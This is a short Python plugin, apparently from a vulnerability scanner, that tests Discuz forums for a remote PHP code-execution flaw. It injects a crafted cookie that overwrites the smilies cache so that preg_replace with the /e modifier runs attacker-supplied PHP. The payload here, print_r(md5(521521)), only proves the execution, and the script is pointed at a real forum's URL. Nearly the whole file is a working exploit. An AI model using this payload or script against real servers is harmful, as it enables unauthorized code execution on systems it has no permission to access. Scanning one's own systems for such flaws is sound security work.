#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
def assign(service, arg):
    if service == "discuz":
        return True, arg

def gettid(args):
    code, head, content, errcode,finalurl = curl.curl(args)
    if code==200:
        tids = re.findall(r'viewthread.php\?tid=(\d+)',content)
        if tids:
            return tids
        tids = re.findall(r'thread-(\d+)-',content)
        if tids:
            return tids
def audit(args):
    tids = gettid(args)
    if tids:
        cookie = 'GLOBALS%5b_DCACHE%5d%5bsmilies%5d%5bsearcharray%5d=/.*/eui;GLOBALS%5b_DCACHE%5d%5bsmilies%5d%5breplacearray%5d=print_r(md5(521521))'
        for tid in tids:
            #帖子中必须有表情images/smilies,才会触发漏洞
            payload = 'viewthread.php?tid='+tid
            verify_url = args + payload
            code, head, content, errcode,finalurl = curl.curl("-b '%s' %s"%(cookie,verify_url))
            if code==200:
                if '35fd19fbe470f0cb5581884fa700610f' in content:
                    security_hole(verify_url)
                    break

if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz', 'http://bbs.cloopen.com/')[1])
